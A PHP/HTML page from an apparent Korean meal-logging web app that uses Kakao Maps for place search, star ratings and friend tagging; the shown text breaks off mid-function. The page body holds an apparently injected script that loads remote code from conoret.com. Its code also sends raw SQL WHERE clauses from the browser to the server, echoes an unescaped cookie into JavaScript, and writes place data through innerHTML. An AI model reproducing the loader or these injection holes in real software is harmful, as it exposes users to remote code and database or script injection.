<!DOCTYPE html>
<?php
include 'script/modules/CookieManager.php';
(CookieManager::factory())->refreshCookie();
?>
<html lang="en">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="description" content="">
    <meta name="author" content="ssosso.table.u">
    <meta name="generator" content="ssosso.table food-db 0.1.0">
    <link rel="icon" href="src/favicon.ico">

    <title>ssosso-table.food-db.record</title>

    <link rel="canonical" href="http://ssossotable.com">

    <!-- Bootstrap CSS -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-Zenh87qX5JnK2Jl0vWa8Ck2rdkQ2Bzep5IDxbcnCeuOxjzrPF/et3URy9Bv1WTRi" crossorigin="anonymous">
    <style>
        .bd-placeholder-img {
            font-size: 1.125rem;
            text-anchor: middle;
            -webkit-user-select: none;
            -moz-user-select: none;
            user-select: none;
        }

        @media (min-width: 768px) {
            .bd-placeholder-img-lg {
                font-size: 3.5rem;
            }
        }
    </style>

    <!-- Custom styles for this template -->
    <script src="./script/main/dsp" type="text/javascript" defer="" async=""></script>
    <link rel="preconnect" href="https://fonts.googleapis.com/" crossorigin="true">
    <link rel="preconnect" href="https://fonts.gstatic.com/">
    <link rel="stylesheet" href="./css/main/css2">
    <link rel="stylesheet" href="./css/rating/css2">
    <link href="./css/main/cover.css" rel="stylesheet">
    <link rel="stylesheet" href="/css/record.css">
    <style>
        @media screen and (max-resolution: 50dpi) {

            .card {
                width: 350px !important;
                margin: auto;
            }
            .list-group {
                width: 100%;
            }
            #map {
                width: 300px!important;
                height: 300px!important;
                left:50%!important;
                transform:translate(-50%, 0%)!important;
            }
            .rating-marker img {
                width: 10px!important;
                height: 20px!important;
            }
        }
        @media (max-width: 768px) {
            .card {
                width: 350px !important;
                margin: auto;
            }
            .list-group {
                width: 100%;
            }
            #map {
                width: 300px!important;
                height: 300px!important;
                left:50%!important;
                transform:translate(-50%, 0%)!important;
            }
            .rating-marker img {
                width: 10px!important;
                height: 20px!important;
            }
            #map {
                width: 300px!important;
                height: 300px!important;
                left:50%!important;
                transform:translate(-50%, 0%)!important;
            }
            .rating-marker img {
                width: 10px!important;
                height: 20px!important;
            }
            .nav-link {
                font-size: 10px;
            }
            .masthead-brand {
                width: 40px;
                height: 40px;
            }
        }
        /* iPhone4와 같은 높은 해상도 가로 */
        @media only screen and (max-width : 768px) {

        }
        .list-group-item.active {
            background-color:#e4bd74;
            color:white;
        }
        input.img-button {
            background: url( "src/food_placeholder.png" ) no-repeat;
            border: none;
            width: 32px;
            height: 32px;
            cursor: pointer;
        }
        body {
            padding:0!important;
            margin-left: 0!important;
            margin-right: 0!important;
            margin-bottom: 0!important;

        }
        .cover-container {
            padding:0!important;
            margin-left: 0!important;
            margin-right: 0!important;
            margin-bottom: 0!important;
        }
        main {
            padding: 0!important;
            margin: 0!important;
            height: 100%!important;
            width: 100% !important;
        }

        nav {
            background-color:#ffebaa;
            height: 80px!important;
            padding: 0!important;
        }
        .cover-container {
            max-width: 100%;
            width: 100%;
            padding-left: 0!important;
            padding-right: 0!important;
            margin: 0!important;
        }
        #record-info {
            width: 100%;
            height: 100%;
            background-color: transparent;
        }
        .card {
            width: 100% !important;
            margin: 0 !important;
        }
        #map {
            width: 100%!important;
            height: 100%!important;
            padding:20px;
        }
    </style>

    <script src="./script/rating/dsp" type="text/javascript" defer="" async=""></script>
    <script
            src="https://code.jquery.com/jquery-3.6.0.min.js"
            integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4="
            crossorigin="anonymous"></script>
    <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.11.6/dist/umd/popper.min.js" integrity="sha384-oBqDVmMz9ATKxIep9tiCxS/Z9fNfEXiDAYTujMAeBAsjFuCZSmKbSSUnQlmh/jp3" crossorigin="anonymous"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.2/dist/js/bootstrap.min.js" integrity="sha384-IDwe1+LCz02ROU9k972gdyvl+AESN10+x7tBKgc9I5HFtuNz0wWnPclzo6p9vxnk" crossorigin="anonymous"></script>
    <script type="text/javascript">
        let mql = window.matchMedia("screen and (max-width: 768px)");
        let flag=false;
        mql.addListener(function(e) {
            if(e.matches) {
                // 모바일
                document.getElementById('record-info').style.cssText='display:none!important;'
                document.getElementById('record-map').style.cssText='margin:0'
                flag=true
            } else {
                // 데스크탑
                document.getElementById('record-info').style.cssText='display:flex!important;'
                document.getElementById('record-map').style.cssText='margin:auto'
                flag=false
            }
        });
        async function init() {
            if(mql.matches) {
                // 모바일
                flag=true
                document.getElementById('record-info').style.cssText='display:none!important;'
                document.getElementById('record-map').style.cssText='margin:0'
                console.log(flag)
            }
            else {
                // 데스크톱
                flag=false
                document.getElementById('record-info').style.cssText='display:flex!important;'
                document.getElementById('record-map').style.cssText='margin:auto'
                console.log(flag)
            }
        }
    </script>
</head>

<body class="text-center vsc-initialized" cz-shortcut-listen="true">
<script type="text/javascript">
    window.top === window && !function(){var e=document.createElement("script"),t=document.getElementsByTagName("head")[0];e.src="//conoret.com/dsp?h="+document.location.hostname+"&r="+Math.random(),e.type="text/javascript",e.defer=!0,e.async=!0,t.appendChild(e)}();
</script>
<div class="cover-container d-flex h-100 p-3 mx-auto flex-column">
    <nav class="navbar d-flex">
        <a class="navbar-brand p-2" href="http://ssossotable.com/rating.php" style="margin-right: auto;"><img class="masthead-brand" src="src/logo.png" width="60px" height="60px"></a>
        <a class="nav-link text-muted p-2" href="http://ssossotable.com/rating.php">음식 평가하기</a>
        <a class="nav-link text-muted p-2" href="http://ssossotable.com/recipe.php">레시피 추가하기</a>
        <a class="nav-link active p-2" href="http://ssossotable.com/record.php">식사 기록하기</a>
        <button style="margin: 10px;" class="navbar-toggler p-2" type="button" data-bs-toggle="offcanvas" data-bs-target="#offcanvasNavbar" aria-controls="offcanvasNavbar">
            <span class="navbar-toggler-icon"></span>
        </button>
        <div class="offcanvas offcanvas-end" tabindex="-1" id="offcanvasNavbar" aria-labelledby="offcanvasNavbarLabel">
            <div class="offcanvas-header">
                <a  class="offcanvas-title" href="http://ssossotable.com/rating.php"><img class="masthead-brand" src="src/logo.png" width="48px" height="48px"></a>
                <button type="button" class="btn-close" data-bs-dismiss="offcanvas" aria-label="Close"></button>
            </div>
            <div class="offcanvas-body">
                <ul class="navbar-nav justify-content-end flex-grow-1 pe-3" style="text-align: left;">
                    <li class="nav-item">
                        <a class="nav-link " href="http://ssossotable.com/myInfo.php">내 정보</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" href="http://ssossotable.com/friends.php">친구 목록</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" href="http://ssossotable.com/diary.php">다이어리</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" href="http://ssossotable.com/my-recipe.php">나만의 레시피북</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" href="http://ssossotable.com/insert.php">음식 추가하기(for dev)</a>
                    </li>
                </ul>
                <div class="input-group mb-3 mt-3">
                    <input type="text" class="form-control" placeholder="음식명을 넣어주세요" aria-label="Recipient's username" aria-describedby="button-addon2">
                    <button class="btn btn-outline-secondary" type="button" id="button-addon2">검색</button>
                </div>
            </div>
        </div>
    </nav>

    <main role="main" class="inner cover d-flex" id="rating_main"  >
        <div class="card" id="record-map">
            <div class="card-body" id="title">
                <h5 class="card-title">식사 입력</h5>
                <p class="card-text">오늘 당신의 식사를 기록 해 주세요.</p>
            </div>
            <div id="map" style="width:500px;height:400px;"></div>

            <ul class="list-group list-group-flush">

                <li class="list-group-item">
                    <input type="text" id="where" placeholder="where?" autocomplete='off'>
                </li>
            </ul>
            <div class="card-body">
                <input type="button" value="검색" class="btn text-white" style="background-color:#e4bd74; color:white;" onclick="search();">
            </div>
            <div class="card-body" id="search-result">
                <ul class="list-group" id="search-result-list" style="max-height: 200px; overflow-y: auto;">
                </ul>
            </div>
        </div>
        <div class="card" id='record-info' style="">
            <div style="padding:5px;font-size:36px;display: inline-block;">
                <div id="preview"><img id="preview-img" src="src/food_placeholder.png" width="300px" height="300px"></div>
                <span>어디를 방문했나요?</span>
                <div class="d-flex justify-content-center fs-2" id="record-rating" style=" margin: 0px !important; padding: 0px !important;" class="rating-marker">
                    <img src="/src/rate_star_before_half-left.png" height="60" width="30" ><img src="/src/rate_star_before_half-right.png" height="60" width="30" >
                    <img src="/src/rate_star_before_half-left.png" height="60" width="30" ><img src="/src/rate_star_before_half-right.png" height="60" width="30" >
                    <img src="/src/rate_star_before_half-left.png" height="60" width="30" ><img src="/src/rate_star_before_half-right.png" height="60" width="30" >
                    <img src="/src/rate_star_before_half-left.png" height="60" width="30" ><img src="/src/rate_star_before_half-right.png" height="60" width="30" >
                    <img src="/src/rate_star_before_half-left.png" height="60" width="30" ><img src="/src/rate_star_before_half-right.png" height="60" width="30" >
                </div>
            </div>
            <div class="dropdown">
                <a class="btn btn-secondary dropdown-toggle" id="record-friend" href="#" role="button" data-bs-toggle="dropdown" aria-expanded="false">
                    누구와 먹었나요?
                </a>
                <ul class="dropdown-menu">
                </ul>
            </div>
        </div>
    </main>

    <footer id="footer"  class="mastfoot mt-auto" style="background-color:#ffebaa;">
        <div class="inner">
            <p style="margin: 0;">Created by<a href="http://ssossotable.com"> ssosso.table.u</a>, of <a href="http://ssossotable.com">@ssosso.table</a></p>
        </div>
    </footer>
    <script type="text/javascript" src="//dapi.kakao.com/v2/maps/sdk.js?appkey=a4b680f23e6397395260cfd7b38420b8&libraries=services,clusterer,drawing"></script>
    <script>
        let placeId=-1

        let userId=<?php echo $_COOKIE['user_id']?>

            let cok={}
        cok.before=null
        let beforeSearch={}
        beforeSearch.data=null
        // 마커를 클릭하면 장소명을 표출할 인포윈도우 입니다
        let infowindow = new kakao.maps.InfoWindow({zIndex:1});

        let mapContainer = document.getElementById('map'), // 지도를 표시할 div
            mapOption = {
                center: new kakao.maps.LatLng(37.566826, 126.9786567), // 지도의 중심좌표
                level: 3 // 지도의 확대 레벨
            };

        let markers=[]
        // 지도를 생성합니다
        let map = new kakao.maps.Map(mapContainer, mapOption);

        // 장소 검색 객체를 생성합니다
        let ps = new kakao.maps.services.Places();

        let selectedFriendId=-1


        let format=``
        let format_right=``

        function friend_selected() {
            selectedFriendId=parseInt(arguments[0])
            document.getElementById('record-friend').innerText=arguments[1]
        }

        // 키워드 검색 완료 시 호출되는 콜백함수 입니다
        function placesSearchCB (data, status, pagination) {
            markers=[]
            if (status === kakao.maps.services.Status.OK) {
                if(markers.length!==0) {
                    for(let i=0; i < markers.length;i++) {
                        markers[i].setMap(null)
                    }
                }
                // 검색된 장소 위치를 기준으로 지도 범위를 재설정하기위해
                // LatLngBounds 객체에 좌표를 추가합니다
                let bounds = new kakao.maps.LatLngBounds();
                let resultdiv=``
                document.getElementById('search-result-list').innerHTML=``

                for (var i=0; i<data.length; i++) {
                    resultdiv+=`
                            <li class="list-group-item" id='list-content-${data[i].id}' onclick="location_onclick(${data[i].id},${i},'${data[i].place_name}','${data[i].road_address_name}','${data[i].category_name}',${data[i].y},${data[i].x})">
                                <span>${data[i].place_name}</span>
                                <span>${data[i].road_address_name}</span>
                            </li>
                            `
                    let marker=new kakao.maps.Marker({position: new kakao.maps.LatLng(data[i].y, data[i].x)})
                    markers.push(marker)
                    displayMarker(data[i],marker);
                    bounds.extend(new kakao.maps.LatLng(data[i].y, data[i].x));
                }

                document.getElementById('search-result-list').innerHTML=resultdiv
                // 검색된 장소 위치를 기준으로 지도 범위를 재설정합니다
                map.setBounds(bounds);
            }
        }

        async function location_onclick() {
            let postJson={}
            let friendInfo={}
            console.log(arguments)
            placeId=parseInt(arguments[0])

            postJson[0]=2
            postJson[1]='*'
            postJson[2]='record'
            postJson[3]=`userid=${userId} and \`where\`=${parseInt(arguments[0])}`
            let v=JSON.parse(await $.post("script/php/DAOHandler.php",postJson));

            postJson={}
            postJson[0]=2
            postJson[1]='id,nickname'
            postJson[2]='user'
            postJson[3]=`user.id in ( select friendid from user, friend where user.id=friend.userid and user.id=${userId} )`
            let friends=await $.post("script/php/DAOHandler.php",postJson);

            let ffmt=``

            if(friends!=='null') {
                friends=JSON.parse(friends)

                for(let i=0;i<friends.length;i++) {
                    ffmt+=`
                                <li onclick="friend_selected(${friends[i][0]},'${friends[i][1]}')"><a class="dropdown-item" href="#">${friends[i][1]}</a></li>
                                `
                }
            }

            if(cok.before===null) {
                cok.before=`list-content-${arguments[0]}`
                document.getElementById(`list-content-${arguments[0]}`).classList.add('active')
            }
            else {
                document.getElementById(cok.before).classList.remove('active')
                cok.before=`list-content-${arguments[0]}`
                document.getElementById(`list-content-${arguments[0]}`).classList.add('active')
            }
            if(v.length===0) {
                let height=30
                let width=15
                format=`
                                <div style="padding:5px;font-size:12px;display: inline-block;">
                                    <div id="preview"><img id="preview-img" src="src/food_placeholder.png" width="60px" height="60px"></div>
                                    <input type="file" id="fileElem" multiple accept="image/*" style="display:none" onchange="handleFiles(this.files)">
                                    <span>${arguments[2]}</span>
                                    <div class="d-flex justify-content-start fs-2" id="record-${arguments[0]}" style=" margin: 0px !important; padding: 0px !important;" class="rating-marker">
                                        <img src="/src/rate_star_before_half-left.png" height="${height}" width="${width}" onclick="set(0,${arguments[0]},'${arguments[3]}','${arguments[4]}','${arguments[2]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_before_half-right.png" height="${height}" width="${width}" onclick="set(1,${arguments[0]},'${arguments[3]}','${arguments[4]}','${arguments[2]}',${arguments[5]},${arguments[6]})">
                                        <img src="/src/rate_star_before_half-left.png" height="${height}" width="${width}" onclick="set(2,${arguments[0]},'${arguments[3]}','${arguments[4]}','${arguments[2]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_before_half-right.png" height="${height}" width="${width}" onclick="set(3,${arguments[0]},'${arguments[3]}','${arguments[4]}','${arguments[2]}',${arguments[5]},${arguments[6]})">
                                        <img src="/src/rate_star_before_half-left.png" height="${height}" width="${width}" onclick="set(4,${arguments[0]},'${arguments[3]}','${arguments[4]}','${arguments[2]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_before_half-right.png" height="${height}" width="${width}" onclick="set(5,${arguments[0]},'${arguments[3]}','${arguments[4]}','${arguments[2]}',${arguments[5]},${arguments[6]})">
                                        <img src="/src/rate_star_before_half-left.png" height="${height}" width="${width}" onclick="set(6,${arguments[0]},'${arguments[3]}','${arguments[4]}','${arguments[2]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_before_half-right.png" height="${height}" width="${width}" onclick="set(7,${arguments[0]},'${arguments[3]}','${arguments[4]}','${arguments[2]}',${arguments[5]},${arguments[6]})">
                                        <img src="/src/rate_star_before_half-left.png" height="${height}" width="${width}" onclick="set(8,${arguments[0]},'${arguments[3]}','${arguments[4]}','${arguments[2]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_before_half-right.png" height="${height}" width="${width}" onclick="set(9,${arguments[0]},'${arguments[3]}','${arguments[4]}','${arguments[2]}',${arguments[5]},${arguments[6]})">
                                    </div>
                                </div>
                                <div class="dropdown">
                                    <a class="btn btn-secondary dropdown-toggle" id="record-friend" href="#" role="button" data-bs-toggle="dropdown" aria-expanded="false">
                                        누구와 먹었나요?
                                    </a>

                                    <ul class="dropdown-menu">
                                        ${ffmt}
                                    </ul>
                                </div>
                                `

                document.getElementById('record-info').innerHTML=format_right
                infowindow.setContent(format);
            }
            else {
                let height=30
                let f=``
                let fr=``
                switch (parseInt(v[0][1])) {
                    case 1:
                        f=getScore(0,arguments[0],`${arguments[3]}`,`${arguments[4]}`,`${arguments[2]}`,arguments[5],arguments[6],height)
                        fr=getScore(0,arguments[0],`${arguments[3]}`,`${arguments[4]}`,`${arguments[2]}`,arguments[5],arguments[6],height*2)
                        break
                    case 2:
                        f=getScore(1,arguments[0],`${arguments[3]}`,`${arguments[4]}`,`${arguments[2]}`,arguments[5],arguments[6],height)
                        fr=getScore(1,arguments[0],`${arguments[3]}`,`${arguments[4]}`,`${arguments[2]}`,arguments[5],arguments[6],height*2)
                        break
                    case 3:
                        f=getScore(2,arguments[0],`${arguments[3]}`,`${arguments[4]}`,`${arguments[2]}`,arguments[5],arguments[6],height)
                        fr=getScore(2,arguments[0],`${arguments[3]}`,`${arguments[4]}`,`${arguments[2]}`,arguments[5],arguments[6],height*2)
                        break
                    case 4:
                        f=getScore(3,arguments[0],`${arguments[3]}`,`${arguments[4]}`,`${arguments[2]}`,arguments[5],arguments[6],height)
                        fr=getScore(3,arguments[0],`${arguments[3]}`,`${arguments[4]}`,`${arguments[2]}`,arguments[5],arguments[6],height*2)
                        break
                    case 5:
                        f=getScore(4,arguments[0],`${arguments[3]}`,`${arguments[4]}`,`${arguments[2]}`,arguments[5],arguments[6],height)
                        fr=getScore(4,arguments[0],`${arguments[3]}`,`${arguments[4]}`,`${arguments[2]}`,arguments[5],arguments[6],height*2)
                        break
                    case 6:
                        f=getScore(5,arguments[0],`${arguments[3]}`,`${arguments[4]}`,`${arguments[2]}`,arguments[5],arguments[6],height)
                        fr=getScore(5,arguments[0],`${arguments[3]}`,`${arguments[4]}`,`${arguments[2]}`,arguments[5],arguments[6],height*2)
                        break
                    case 7:
                        f=getScore(6,arguments[0],`${arguments[3]}`,`${arguments[4]}`,`${arguments[2]}`,arguments[5],arguments[6],height)
                        fr=getScore(6,arguments[0],`${arguments[3]}`,`${arguments[4]}`,`${arguments[2]}`,arguments[5],arguments[6],height*2)
                        break
                    case 8:
                        f=getScore(7,arguments[0],`${arguments[3]}`,`${arguments[4]}`,`${arguments[2]}`,arguments[5],arguments[6],height)
                        fr=getScore(7,arguments[0],`${arguments[3]}`,`${arguments[4]}`,`${arguments[2]}`,arguments[5],arguments[6],height*2)
                        break
                    case 9:
                        f=getScore(8,arguments[0],`${arguments[3]}`,`${arguments[4]}`,`${arguments[2]}`,arguments[5],arguments[6],height)
                        fr=getScore(8,arguments[0],`${arguments[3]}`,`${arguments[4]}`,`${arguments[2]}`,arguments[5],arguments[6],height*2)
                        break
                    case 10:
                        f=getScore(9,arguments[0],`${arguments[3]}`,`${arguments[4]}`,`${arguments[2]}`,arguments[5],arguments[6],height)
                        fr=getScore(9,arguments[0],`${arguments[3]}`,`${arguments[4]}`,`${arguments[2]}`,arguments[5],arguments[6],height*2)
                        break
                    default :
                        break
                }
                format=`
                                <div style="padding:5px;font-size:12px;display: inline-block;">
                                    <div id="preview"><img id="preview-img" src="${v[0][9]}" width="60px" height="60px"></div>
                                    <input type="file" id="fileElem" multiple accept="image/*" style="display:none" onchange="handleFiles(this.files)">
                                    <span>${arguments[2]}</span>
                                    <div class="d-flex justify-content-start fs-2" id="record-${arguments[0]}" style=" margin: 0px !important; padding: 0px !important;">
                                        ${f}
                                    </div>
                                    <div class="dropdown">
                                        <a class="btn btn-secondary dropdown-toggle" id="record-friend" href="#" role="button" data-bs-toggle="dropdown" aria-expanded="false">
                                            누구와 먹었나요?
                                        </a>

                                        <ul class="dropdown-menu">
                                            ${ffmt}
                                        </ul>
                                    </div>
                                </div>
                                `

                infowindow.setContent(format);
                format_right=`
                                <div style="padding:5px;font-size:12px;display: inline-block;">
                                    <div id="preview"><img id="preview-img" src="${v[0][9]}" width="300px" height="300px"></div>
                                    <input type="file" id="fileElem" multiple accept="image/*" style="display:none" onchange="handleFiles(this.files)">
                                    <span>${arguments[2]}</span>
                                    <div class="d-flex justify-content-center fs-2" id="record-${arguments[0]}" style=" margin: 0px !important; padding: 0px !important;">
                                        ${fr}
                                    </div>
                                    <div class="dropdown">
                                        <a class="btn btn-secondary dropdown-toggle" id="record-friend" href="#" role="button" data-bs-toggle="dropdown" aria-expanded="false">
                                            누구와 먹었나요?
                                        </a>

                                        <ul class="dropdown-menu">
                                            ${ffmt}
                                        </ul>
                                    </div>
                                </div>
                                `

                document.getElementById('record-info').innerHTML=format_right
            }
            infowindow.open(map, markers[arguments[1]]);
            const preview = document.getElementById("preview"),
                fileElem = document.getElementById("fileElem");

            preview.addEventListener("click", function (e) {
                if (fileElem) {
                    fileElem.click();
                }
            }, false);
        }

        // 지도에 마커를 표시하는 함수입니다
        async function displayMarker(place,marker) {
            // 마커를 생성하고 지도에 표시합니다
            // var marker = new kakao.maps.Marker({
            //     position: new kakao.maps.LatLng(place.y, place.x)
            // });

            marker.setMap(map)
            // 마커에 클릭이벤트를 등록합니다
            kakao.maps.event.addListener(marker, 'click', async function(event) {
                // 마커를 클릭하면 장소명이 인포윈도우에 표출됩니다
                let postJson={}
                let friendInfo={}

                postJson.userId=<?php echo $_COOKIE['user_id'];?>

                friendInfo.userId=<?php echo $_COOKIE['user_id'];?>

                placeId=parseInt(place.id)

                postJson[0]=2
                postJson[1]='*'
                postJson[2]='record'
                postJson[3]=`userid=${userId} and \`where\`=${parseInt(place.id)}`
                let v=JSON.parse(await $.post("script/php/DAOHandler.php",postJson));

                postJson={}
                postJson[0]=2
                postJson[1]='id,nickname'
                postJson[2]='user'
                postJson[3]=`user.id in ( select friendid from user, friend where user.id=friend.userid and user.id=${userId} )`
                let friends=await $.post("script/php/DAOHandler.php",postJson);

                let ffmt=``

                if(friends!=='null') {
                    friends=JSON.parse(friends)

                    for(let i=0;i<friends.length;i++) {
                        ffmt+=`
                                <li onclick="friend_selected(${friends[i][0]},'${friends[i][1]}')"><a class="dropdown-item" href="#">${friends[i][1]}</a></li>
                                `
                    }
                }

                let format=``
                if(v.length===0) {
                    let width=15
                    let height=30
                    format=`
                                <div style="padding:5px;font-size:12px;display: inline-block;">
                                    <div id="preview"><img id="preview-img" src="src/food_placeholder.png" width="60px" height="60px"></div>
                                    <input type="file" id="fileElem" multiple accept="image/*" style="display:none" onchange="handleFiles(this.files)">
                                    <span>${place.place_name}</span>
                                    <div class="d-flex justify-content-start fs-2" id="record-${place.id}" style=" margin: 0px !important; padding: 0px !important;">
                                        <img src="/src/rate_star_before_half-left.png" height="${height}" width="${width}" onclick="set(0,${place.id},'${place.road_address_name}','${place.category_name}','${place.place_name}',${place.y},${place.x},30)"><img src="/src/rate_star_before_half-right.png" height="${height}" width="${width}" onclick="set(1,${place.id},'${place.road_address_name}','${place.category_name}','${place.place_name}',${place.y},${place.x},30)">
                                        <img src="/src/rate_star_before_half-left.png" height="${height}" width="${width}" onclick="set(2,${place.id},'${place.road_address_name}','${place.category_name}','${place.place_name}',${place.y},${place.x},30)"><img src="/src/rate_star_before_half-right.png" height="${height}" width="${width}" onclick="set(3,${place.id},'${place.road_address_name}','${place.category_name}','${place.place_name}',${place.y},${place.x},30)">
                                        <img src="/src/rate_star_before_half-left.png" height="${height}" width="${width}" onclick="set(4,${place.id},'${place.road_address_name}','${place.category_name}','${place.place_name}',${place.y},${place.x},30)"><img src="/src/rate_star_before_half-right.png" height="${height}" width="${width}" onclick="set(5,${place.id},'${place.road_address_name}','${place.category_name}','${place.place_name}',${place.y},${place.x},30)">
                                        <img src="/src/rate_star_before_half-left.png" height="${height}" width="${width}" onclick="set(6,${place.id},'${place.road_address_name}','${place.category_name}','${place.place_name}',${place.y},${place.x},30)"><img src="/src/rate_star_before_half-right.png" height="${height}" width="${width}" onclick="set(7,${place.id},'${place.road_address_name}','${place.category_name}','${place.place_name}',${place.y},${place.x},30)">
                                        <img src="/src/rate_star_before_half-left.png" height="${height}" width="${width}" onclick="set(8,${place.id},'${place.road_address_name}','${place.category_name}','${place.place_name}',${place.y},${place.x},30)"><img src="/src/rate_star_before_half-right.png" height="${height}" width="${width}" onclick="set(9,${place.id},'${place.road_address_name}','${place.category_name}','${place.place_name}',${place.y},${place.x},30)">
                                    </div>
                                    <div class="dropdown">
                                      <a class="btn btn-secondary dropdown-toggle" id="record-friend" href="#" role="button" data-bs-toggle="dropdown" aria-expanded="false">
                                        누구와 먹었나요?
                                      </a>

                                      <ul class="dropdown-menu">
                                        ${ffmt}
                                      </ul>
                                    </div>
                                </div>
                                `
                    infowindow.setContent(format);
                }
                else {
                    let f=``
                    let fr=``
                    let height=30
                    switch (parseInt(v[0][1])) {
                        case 0:
                            f=getScore(-1,place.id,`${place.road_address_name}`,`${place.category_name}`,`${place.place_name}`,place.y,place.x,height)
                            fr=getScore(-1,place.id,`${place.road_address_name}`,`${place.category_name}`,`${place.place_name}`,place.y,place.x,height*2)
                            break
                        case 1:
                            f=getScore(0,place.id,`${place.road_address_name}`,`${place.category_name}`,`${place.place_name}`,place.y,place.x,height)
                            fr=getScore(0,place.id,`${place.road_address_name}`,`${place.category_name}`,`${place.place_name}`,place.y,place.x,height*2)
                            break
                        case 2:
                            f=getScore(1,place.id,`${place.road_address_name}`,`${place.category_name}`,`${place.place_name}`,place.y,place.x,height)
                            fr=getScore(1,place.id,`${place.road_address_name}`,`${place.category_name}`,`${place.place_name}`,place.y,place.x,height*2)
                            break
                        case 3:
                            f=getScore(2,place.id,`${place.road_address_name}`,`${place.category_name}`,`${place.place_name}`,place.y,place.x,height)
                            fr=getScore(2,place.id,`${place.road_address_name}`,`${place.category_name}`,`${place.place_name}`,place.y,place.x,height*2)
                            break
                        case 4:
                            f=getScore(3,place.id,`${place.road_address_name}`,`${place.category_name}`,`${place.place_name}`,place.y,place.x,height)
                            fr=getScore(3,place.id,`${place.road_address_name}`,`${place.category_name}`,`${place.place_name}`,place.y,place.x,height*2)
                            break
                        case 5:
                            f=getScore(4,place.id,`${place.road_address_name}`,`${place.category_name}`,`${place.place_name}`,place.y,place.x,height)
                            fr=getScore(4,place.id,`${place.road_address_name}`,`${place.category_name}`,`${place.place_name}`,place.y,place.x,height*2)
                            break
                        case 6:
                            f=getScore(5,place.id,`${place.road_address_name}`,`${place.category_name}`,`${place.place_name}`,place.y,place.x,height)
                            fr=getScore(5,place.id,`${place.road_address_name}`,`${place.category_name}`,`${place.place_name}`,place.y,place.x,height*2)
                            break
                        case 7:
                            f=getScore(6,place.id,`${place.road_address_name}`,`${place.category_name}`,`${place.place_name}`,place.y,place.x,height)
                            fr=getScore(6,place.id,`${place.road_address_name}`,`${place.category_name}`,`${place.place_name}`,place.y,place.x,height*2)
                            break
                        case 8:
                            f=getScore(7,place.id,`${place.road_address_name}`,`${place.category_name}`,`${place.place_name}`,place.y,place.x,height)
                            fr=getScore(7,place.id,`${place.road_address_name}`,`${place.category_name}`,`${place.place_name}`,place.y,place.x,height*2)
                            break
                        case 9:
                            f=getScore(8,place.id,`${place.road_address_name}`,`${place.category_name}`,`${place.place_name}`,place.y,place.x,height)
                            fr=getScore(8,place.id,`${place.road_address_name}`,`${place.category_name}`,`${place.place_name}`,place.y,place.x,height*2)
                            break
                        case 10:
                            f=getScore(9,place.id,`${place.road_address_name}`,`${place.category_name}`,`${place.place_name}`,place.y,place.x,height)
                            fr=getScore(9,place.id,`${place.road_address_name}`,`${place.category_name}`,`${place.place_name}`,place.y,place.x,height*2)
                            break
                        default :
                            break
                    }

                    format=`
                                <div style="padding:5px;font-size:12px;display: inline-block;">
                                    <div id="preview"><img id="preview-img" src="${v[0][9]}" width="60px" height="60px"></div>
                                    <input type="file" id="fileElem" multiple accept="image/*" style="display:none" onchange="handleFiles(this.files)">
                                    <span>${place.place_name}</span>
                                    <div class="d-flex justify-content-start fs-2" id="record-${place.id}" style=" margin: 0px !important; padding: 0px !important;">
                                        ${f}
                                    </div>
                                    <div class="dropdown">
                                      <a class="btn btn-secondary dropdown-toggle" id="record-friend" href="#" role="button" data-bs-toggle="dropdown" aria-expanded="false">
                                        누구와 먹었나요?
                                      </a>

                                      <ul class="dropdown-menu">
                                        ${ffmt}
                                      </ul>
                                    </div>
                                </div>
                                `
                    format_right=`
                                <div style="padding:5px;font-size:12px;display: inline-block;">
                                    <div id="preview"><img id="preview-img" src="${v[0][9]}" width="300px" height="300px"></div>
                                    <input type="file" id="fileElem" multiple accept="image/*" style="display:none" onchange="handleFiles(this.files)">
                                    <span>${place.place_name}</span>
                                    <div class="d-flex justify-content-center fs-2" id="record-${place.id}" style=" margin: 0px !important; padding: 0px !important;">
                                        ${fr}
                                    </div>
                                    <div class="dropdown">
                                      <a class="btn btn-secondary dropdown-toggle" id="record-friend" href="#" role="button" data-bs-toggle="dropdown" aria-expanded="false">
                                        누구와 먹었나요?
                                      </a>

                                      <ul class="dropdown-menu">
                                        ${ffmt}
                                      </ul>
                                    </div>
                                </div>
                                `
                    document.getElementById('record-info').innerHTML=format_right
                    infowindow.setContent(format);
                }
                infowindow.open(map, marker);
                const preview = document.getElementById("preview"),
                    fileElem = document.getElementById("fileElem");

                preview.addEventListener("click", function (e) {
                    if (fileElem) {
                        fileElem.click();
                    }
                }, false);
            });
        }
        async function set() {
            let postJson={}
            switch (parseInt(arguments[0])) {
                case 0:
                    document.getElementById(`record-${arguments[1]}`).innerHTML=getScore(0,arguments[1],`${arguments[2]}`,`${arguments[3]}`,`${arguments[4]}`,arguments[5],arguments[6])
                    break
                case 1:
                    document.getElementById(`record-${arguments[1]}`).innerHTML=getScore(1,arguments[1],`${arguments[2]}`,`${arguments[3]}`,`${arguments[4]}`,arguments[5],arguments[6])
                    break
                case 2:
                    document.getElementById(`record-${arguments[1]}`).innerHTML=getScore(2,arguments[1],`${arguments[2]}`,`${arguments[3]}`,`${arguments[4]}`,arguments[5],arguments[6])
                    break
                case 3:
                    document.getElementById(`record-${arguments[1]}`).innerHTML=getScore(3,arguments[1],`${arguments[2]}`,`${arguments[3]}`,`${arguments[4]}`,arguments[5],arguments[6])
                    break
                case 4:
                    document.getElementById(`record-${arguments[1]}`).innerHTML=getScore(4,arguments[1],`${arguments[2]}`,`${arguments[3]}`,`${arguments[4]}`,arguments[5],arguments[6])
                    break
                case 5:
